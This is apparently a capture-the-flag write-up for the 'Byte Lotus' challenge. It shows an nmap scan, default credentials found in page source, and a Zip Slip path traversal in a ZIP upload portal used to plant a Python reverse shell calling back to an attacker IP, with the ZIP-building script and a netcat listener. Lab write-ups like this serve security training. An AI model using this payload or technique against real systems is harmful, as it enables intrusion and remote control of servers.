# Byte Lotus — Zip Slip to Reverse Shell

## Challenge Description

> You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.
>
> The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore.
>
> Slip past what the portal forgets to check, and the shell answers with a shell of your own.

The challenge involves a web application running on a remote host. The goal is to exploit the file-upload functionality and ultimately obtain a reverse shell on the server.

---

## 1. Port Scanning

Before interacting with the web application, we first need to determine which ports are exposed.

Using Nmap:

```bash
nmap -sV 10.49.174.194
```

Output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 09:11 +0530
Nmap scan report for 10.49.174.194
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two interesting ports are exposed:

| Port   | Service | Version       |
| ------ | ------- | ------------- |
| `22`   | SSH     | OpenSSH 9.6p1 |
| `5000` | HTTP    | Gunicorn      |

The web application is therefore available on:

```text
http://10.49.174.194:5000
```

---

## 2. Finding the Login Credentials

Opening the application gives us a login page.

Instead of immediately attempting brute force, we inspect the page source.

Inside the HTML source, we find the following comment:

```text
───────────────────────────────────────────────────────────────
    Byte Lotus // internal display-manager portal

    New on the floor team? IT seeds every property with the same
    starter login until you set your own:

        user: concierge
        pass: StayNoticed2024!

    (rotate it from Settings on first sign-in — most people forget)
───────────────────────────────────────────────────────────────
```

The credentials are therefore:

```text
Username: concierge
Password: StayNoticed2024!
```

Using these credentials, we can successfully log into the portal.

---

## 3. Exploring the File Upload Functionality

After logging in, we find an option to upload a **shell**.

The application describes the upload format as:

> Found something on the beach? Upload it as a shell (a `.zip` souvenir pack) to set the ambiance on the in-room tablets. Each shell must contain a `shell.json` manifest listing its assets (images, stylesheets).

This immediately makes the ZIP extraction functionality interesting.

The application expects a ZIP archive containing a `shell.json` file.

We first create a completely legitimate ZIP file.

### `shell.json`

```json
{
    "name": "test",
    "assets": []
}
```

We package it into a ZIP:

```bash
zip test.zip shell.json
```

and upload it.

The upload succeeds.

This confirms that ZIP archives are being extracted server-side.

---

## 4. Identifying the Zip Slip Vulnerability

Whenever an application extracts ZIP archives, one important security issue to check for is **Zip Slip**.

Zip Slip occurs when an application extracts archive entries without validating their paths.

For example, a malicious ZIP could contain:

```text
../../hooks/callback.py
```

If the server extracts this entry relative to its intended extraction directory without sanitising the path, the `../` components can cause the file to be written outside the intended directory.

Conceptually:

```text
uploads/
└── shell/
    └── extracted/
        └── ../../hooks/callback.py
```

could resolve to:

```text
hooks/
└── callback.py
```

depending on the application's directory structure.

The challenge description's wording:

> "Slip past what the portal forgets to check"

is also a strong hint toward a path traversal issue during archive extraction.

---

## 5. Creating the Reverse Shell Payload

Since the objective is to obtain code execution, we create a Python reverse-shell payload.

The payload connects back to our machine and redirects standard input, output, and error to the socket.

```python
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.142.96", 4444))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
```

Here:

* `192.168.142.96` is our attacking machine.
* `4444` is the port on which we will listen.
* `socket.connect()` establishes the connection back to us.
* `os.dup2()` redirects stdin/stdout/stderr to the socket.
* `pty.spawn("/bin/bash")` provides an interactive Bash shell.

---

## 6. Crafting the Malicious ZIP

We can automate the creation of the ZIP archive using Python.

```python
import json
import zipfile

LHOST = "192.168.142.96"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

The important part is:

```python
archive.writestr("../../hooks/callback.py", callback)
```

The filename contains:

```text
../../
```

which attempts to traverse outside the intended extraction directory.

The resulting archive contains:

```text
Length      Date    Time    Name
---------  ---------- -----   ----
       42  2026-09-05 09:57   shell.json
      226  2026-09-05 09:57   ../../hooks/callback.py
---------  ---------- -----   ----
      268                     2 files
```

The ZIP therefore contains both the required manifest and our malicious path-traversal entry.

---

##  7. Starting the Listener

Before uploading the malicious archive, we start a Netcat listener on our machine:

```bash
nc -lvnp 4444
```

This waits for the target server to connect back to us.

---

## 8. Uploading the Malicious ZIP

We then upload:

```text
reverse-shell.zip
```

through the Shoreline Display portal.

If the server is vulnerable to Zip Slip and the extracted `callback.py` is subsequently loaded/executed by the application, the server connects back to our listener.

Our Netcat terminal receives a connection:

```text
connect to [192.168.142.96] from <TARGET>
```

We now have a shell on the target machine.

---

## 9. Finding the Flag

Once we have shell access, we inspect the `/home` directory:

```bash
ls -la /home
```

We can then enumerate the users/directories and locate the challenge flag.

For example:

```bash
find /home -type f -name "flag*" 2>/dev/null
```

Once the flag file is identified:

```bash
cat /home/<user>/<flag-file>
```

This reveals the flag.

---

# Attack Chain

The complete exploitation chain is:

```text
Nmap
  │
  ▼
Port 5000
  │
  ▼
Web Login
  │
  ▼
Credentials found in page source
  │
  ▼
Authenticated Portal
  │
  ▼
ZIP Upload
  │
  ▼
ZIP Extraction
  │
  ▼
Zip Slip / Path Traversal
  │
  ▼
Write callback.py outside extraction directory
  │
  ▼
Python Payload Execution
  │
  ▼
Reverse Shell
  │
  ▼
Enumerate /home
  │
  ▼
Read Flag
```

## Key Takeaways

The challenge demonstrates several important penetration-testing concepts:

1. **Service Enumeration** — Nmap identified the exposed web service on port `5000`.
2. **Source-Code Inspection** — Credentials were accidentally exposed in the HTML source.
3. **File-Upload Testing** — The ZIP upload functionality provided an interesting attack surface.
4. **Zip Slip** — Unsanitised archive paths containing `../` can allow files to be written outside the intended directory.
5. **Reverse Shells** — Arbitrary Python execution can be turned into an interactive shell.
6. **Post-Exploitation Enumeration** — Once shell access is obtained, `/home` can be enumerated to locate the flag.

The core vulnerability is the failure to safely validate paths during ZIP extraction. A secure implementation should canonicalise extracted paths and ensure that every resulting path remains inside the intended extraction directory before writing the file.
